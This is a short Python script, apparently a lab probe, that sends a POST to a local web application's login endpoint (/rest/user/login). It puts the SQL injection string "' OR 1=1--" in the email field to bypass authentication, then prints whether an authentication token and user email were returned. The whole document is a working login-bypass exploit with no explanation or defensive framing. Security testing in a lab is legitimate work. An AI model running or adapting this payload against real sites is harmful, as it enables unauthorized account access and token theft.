import urllib.request
import json

url = "http://localhost:3000/rest/user/login"
payload = json.dumps({"email": "' OR 1=1--", "password": "password"}).encode("utf-8")
headers = {"Content-Type": "application/json", "User-Agent": "AntigravityLabProber/1.0"}

req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
try:
    with urllib.request.urlopen(req, timeout=5) as resp:
        print("Status:", resp.getcode())
        data = json.loads(resp.read().decode("utf-8"))
        print("Token received:", bool(data.get("authentication", {}).get("token")))
        print("User:", data.get("authentication", {}).get("umail"))
except Exception as e:
    print("Error:", e)
